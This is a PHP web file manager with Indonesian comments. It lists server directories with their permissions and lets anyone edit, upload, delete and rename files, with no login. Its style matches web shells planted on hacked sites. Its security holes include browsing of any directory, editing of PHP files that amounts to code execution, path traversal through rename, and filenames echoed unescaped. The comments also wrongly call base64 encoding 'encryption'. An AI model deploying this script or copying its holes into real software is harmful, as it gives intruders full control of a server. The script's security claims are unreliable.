<?php
$uploadDir = __DIR__; // Direktori tempat file diupload

// Fungsi untuk memvalidasi jalur direktori agar tetap dalam batas aman
function is_safe_path($path, $base) {
    $realBase = realpath($base);
    $realPath = realpath($path);
    return $realPath && strpos($realPath, $realBase) === 0; // Pastikan path berada di dalam direktori yang diizinkan
}

// Fungsi untuk mengedit file
if (isset($_GET['edit']) && is_file($_GET['edit']) && is_safe_path($_GET['edit'], $uploadDir)) {
    $filePath = $_GET['edit'];

    if (isset($_POST['content'])) {
        // Simpan konten ke file
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('File berhasil disimpan');</script>";
    }

    // Tampilkan editor file
    echo '<form method="POST">';
    echo '<textarea name="content" style="width:100%;height:300px;">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea>';
    echo '<br><input type="submit" value="Simpan">';
    echo '</form>';
    exit;
}

// Fungsi untuk mengupload file
if (isset($_FILES['upload'])) {
    $uploadName = basename($_FILES['upload']['name']); // Ambil nama file asli
    $uploadTmp = $_FILES['upload']['tmp_name'];

    // Cek apakah file dengan nama yang sama sudah ada, jika ada, beri nama baru
    $uploadPath = "$uploadDir/$uploadName";
    if (file_exists($uploadPath)) {
        $uploadName = time() . '_' . $uploadName; // Menambahkan timestamp untuk menghindari duplikasi
        $uploadPath = "$uploadDir/$uploadName";
    }

    // Tentukan ekstensi yang diizinkan
    $allowedExtensions = ['php', 'html', 'txt', 'jpg', 'png', 'jpeg', 'gif'];
    $fileExtension = strtolower(pathinfo($uploadName, PATHINFO_EXTENSION));

    // Cek apakah ekstensi file diizinkan
    if (in_array($fileExtension, $allowedExtensions)) {
        // Enkripsi file dengan base64 untuk keamanan
        $fileData = file_get_contents($uploadTmp);
        $encodedData = base64_encode($fileData);
        file_put_contents($uploadPath . '.encoded', $encodedData); // Simpan file yang dienkripsi

        // Pastikan file yang di-upload tidak dapat dieksekusi
        chmod($uploadPath . '.encoded', 0644); // Set izin file agar tidak dapat dieksekusi

        echo "<script>alert('File berhasil diupload dan dienkripsi');</script>";
    } else {
        echo "<script>alert('Ekstensi file tidak diizinkan');</script>";
    }
}

// Fungsi untuk menghapus file atau folder
if (isset($_GET['delete']) && is_safe_path($_GET['delete'], $uploadDir)) {
    $deletePath = $_GET['delete'];

    if (is_file($deletePath)) {
        unlink($deletePath); // Hapus file
        echo "<script>alert('File berhasil dihapus');</script>";
    } elseif (is_dir($deletePath)) {
        rmdir($deletePath); // Hapus folder (folder harus kosong)
        echo "<script>alert('Folder berhasil dihapus');</script>";
    }
}

// Fungsi untuk mengganti nama file atau folder
if (isset($_GET['rename']) && isset($_POST['newName']) && is_safe_path($_GET['rename'], $uploadDir)) {
    $oldPath = $_GET['rename'];
    $newName = $_POST['newName'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;

    if (rename($oldPath, $newPath)) {
        echo "<script>alert('File atau folder berhasil diganti namanya');</script>";
    } else {
        echo "<script>alert('Gagal mengganti nama file atau folder');</script>";
    }
}

// Fungsi untuk mengonversi izin file ke format octal
function getFilePermissions($file) {
    $permissions = fileperms($file);

    // Jika file adalah direktori, tambahkan 040000
    if (is_dir($file)) {
        $permissions |= 0x4000;
    }

    // Mengonversi izin file menjadi format octal
    return substr(decoct($permissions), -4);
}

// Menampilkan daftar file dan folder di direktori
$dir = isset($_GET['d']) ? $_GET['d'] : $uploadDir;
$files = scandir($dir);

// Fungsi untuk menampilkan breadcrumb path seperti shell pwd
function show_pwd($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $path = '';
    $pwd = '';

    foreach ($parts as $part) {
        $path .= DIRECTORY_SEPARATOR . $part;
        $pwd .= "<a href='?d=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($pwd, ' / ');
}

echo '<form method="POST" enctype="multipart/form-data">';
echo '<input type="file" name="upload">';
echo '<input type="submit" value="Upload">';
echo '</form>';

echo '<h2>Current Directory (PWD)</h2>';
echo '<p>' . show_pwd($dir) . '</p>';

echo '<ul>';
if ($dir !== $uploadDir) {
    // Tombol untuk kembali ke direktori sebelumnya
    echo '<li><a href="?d=' . urlencode(dirname($dir)) . '">.. (Kembali)</a></li>';
}

// Tombol untuk kembali ke direktori awal (root path tempat file diupload)
echo '<li><a href="?d=' . urlencode($uploadDir) . '">Back to Root Directory</a></li>';

foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = realpath("$dir/$f");

    // Menampilkan izin file dalam format octal
    $permissions = getFilePermissions($path);

    if (is_dir($path)) {
        echo "<li>[DIR] <a href='?d=" . urlencode($path) . "'>$f</a> 
                <a href='?d=" . urlencode($dir) . "&delete=" . urlencode($path) . "' onclick='return confirm(\"Apakah Anda yakin ingin menghapus folder?\");'>[Hapus]</a> 
                <span>Permissions: $permissions</span></li>";
    } else {
        echo "<li>[FILE] <a href='?d=" . urlencode($dir) . "&edit=" . urlencode($path) . "'>$f</a> 
                <a href='?d=" . urlencode($dir) . "&delete=" . urlencode($path) . "' onclick='return confirm(\"Apakah Anda yakin ingin menghapus file?\");'>[Hapus]</a>
                <a href='?d=" . urlencode($dir) . "&rename=" . urlencode($path) . "'>[Rename]</a>
                <span>Permissions: $permissions</span></li>";
    }
}
echo '</ul>';

if (isset($_GET['rename'])) {
    $renamePath = $_GET['rename'];
    echo '<form method="POST">';
    echo 'New Name: <input type="text" name="newName" value="' . basename($renamePath) . '">';
    echo '<input type="submit" value="Rename">';
    echo '</form>';
}
?>
